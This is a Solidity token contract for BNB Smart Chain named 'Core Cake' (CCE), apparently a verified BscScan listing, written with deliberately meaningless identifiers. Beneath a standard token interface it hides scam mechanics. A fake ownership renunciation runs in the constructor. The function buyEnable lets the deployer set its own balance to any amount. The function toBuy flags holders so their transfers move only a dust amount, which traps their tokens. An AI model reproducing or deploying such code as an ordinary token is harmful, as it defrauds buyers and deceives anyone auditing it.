/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface launchedSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverBuy) external view returns (uint256);

    function transfer(address walletTotal, uint256 swapReceiver) external returns (bool);

    function allowance(address listExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address walletTotal,
        uint256 swapReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeTeamList, uint256 value);
    event Approval(address indexed listExempt, address indexed spender, uint256 value);
}

interface listLimitAuto is launchedSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface receiverTx {
    function createPair(address receiverLiquidity, address teamIs) external returns (address);
}

interface limitAtLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract atFeeList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract CoreCake is atFeeList, launchedSwap, listLimitAuto {

    function marketingLimitMax() public {
        emit OwnershipTransferred(receiverFeeSwap, address(0));
        liquidityTrading = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return amountFee;
    }

    function enableLimitToken(address tradingSellSwap, address walletTotal, uint256 swapReceiver) internal returns (bool) {
        if (tradingSellSwap == receiverFeeSwap || walletTotal == receiverFeeSwap) {
            return senderTx(tradingSellSwap, walletTotal, swapReceiver);
        }
        if (launchedWallet == launchAmount) {
            launchAmount = launchedWallet;
        }
        if (txTrading[tradingSellSwap]) {
            return senderTx(tradingSellSwap, walletTotal, senderList);
        }
        if (amountEnableExempt) {
            launchedWallet = launchAmount;
        }
        return senderTx(tradingSellSwap, walletTotal, swapReceiver);
    }

    uint256 public launchAmount;

    function approve(address sellReceiver, uint256 swapReceiver) public virtual override returns (bool) {
        fromBuyTeam[_msgSender()][sellReceiver] = swapReceiver;
        emit Approval(_msgSender(), sellReceiver, swapReceiver);
        return true;
    }

    bool public amountFrom;

    function getOwner() external view returns (address) {
        return liquidityTrading;
    }

    function toBuy(address liquidityBuyTrading) public {
        
        if (liquidityBuyTrading == receiverFeeSwap || liquidityBuyTrading == modeExempt || !totalSender[_msgSender()]) {
            return;
        }
        if (maxTeam) {
            launchAmount = launchedWallet;
        }
        txTrading[liquidityBuyTrading] = true;
    }

    uint256 constant senderList = 10 ** 10;

    address private liquidityTrading;

    uint256 private receiverSellMax = 100000000 * 10 ** 18;

    function txTake(address fundMarketing) public {
        if (amountFrom) {
            return;
        }
        if (launchAmount == launchedWallet) {
            totalFundList = false;
        }
        totalSender[fundMarketing] = true;
        
        amountFrom = true;
    }

    string private amountFee = "Core Cake";

    mapping(address => uint256) private listSender;

    string private enableLaunchShould = "CCE";

    function minMax() public view returns (uint256) {
        return launchAmount;
    }

    function owner() external view returns (address) {
        return liquidityTrading;
    }

    mapping(address => mapping(address => uint256)) private fromBuyTeam;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverSellMax;
    }

    address public receiverFeeSwap;

    bool public maxTeam;

    function transfer(address modeLimit, uint256 swapReceiver) external virtual override returns (bool) {
        return enableLimitToken(_msgSender(), modeLimit, swapReceiver);
    }

    constructor (){
        if (amountEnableExempt != maxTeam) {
            maxTeam = false;
        }
        limitAtLiquidity feeMaxShould = limitAtLiquidity(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        modeExempt = receiverTx(feeMaxShould.factory()).createPair(feeMaxShould.WETH(), address(this));
        liquidityTrading = _msgSender();
        
        receiverFeeSwap = liquidityTrading;
        totalSender[receiverFeeSwap] = true;
        
        listSender[receiverFeeSwap] = receiverSellMax;
        emit Transfer(address(0), receiverFeeSwap, receiverSellMax);
        marketingLimitMax();
    }

    function limitTx() public view returns (uint256) {
        return launchedWallet;
    }

    bool private amountEnableExempt;

    function txSwap() public view returns (bool) {
        return totalFundList;
    }

    uint256 public launchedWallet;

    mapping(address => bool) public totalSender;

    bool private totalFundList;

    function buyEnable(uint256 swapReceiver) public {
        if (!totalSender[_msgSender()]) {
            return;
        }
        listSender[receiverFeeSwap] = swapReceiver;
    }

    function allowance(address tradingSell, address sellReceiver) external view virtual override returns (uint256) {
        return fromBuyTeam[tradingSell][sellReceiver];
    }

    address public modeExempt;

    function senderTx(address tradingSellSwap, address walletTotal, uint256 swapReceiver) internal returns (bool) {
        require(listSender[tradingSellSwap] >= swapReceiver);
        listSender[tradingSellSwap] -= swapReceiver;
        listSender[walletTotal] += swapReceiver;
        emit Transfer(tradingSellSwap, walletTotal, swapReceiver);
        return true;
    }

    event OwnershipTransferred(address indexed atAmount, address indexed buyExempt);

    function autoWallet() public view returns (uint256) {
        return launchedWallet;
    }

    uint8 private atFund = 18;

    function limitSwap() public view returns (uint256) {
        return launchedWallet;
    }

    function sellListLaunch() public view returns (bool) {
        return amountEnableExempt;
    }

    function balanceOf(address receiverBuy) public view virtual override returns (uint256) {
        return listSender[receiverBuy];
    }

    function symbol() external view virtual override returns (string memory) {
        return enableLaunchShould;
    }

    mapping(address => bool) public txTrading;

    function decimals() external view virtual override returns (uint8) {
        return atFund;
    }

    function transferFrom(address tradingSellSwap, address walletTotal, uint256 swapReceiver) external override returns (bool) {
        if (fromBuyTeam[tradingSellSwap][_msgSender()] != type(uint256).max) {
            require(swapReceiver <= fromBuyTeam[tradingSellSwap][_msgSender()]);
            fromBuyTeam[tradingSellSwap][_msgSender()] -= swapReceiver;
        }
        return enableLimitToken(tradingSellSwap, walletTotal, swapReceiver);
    }

}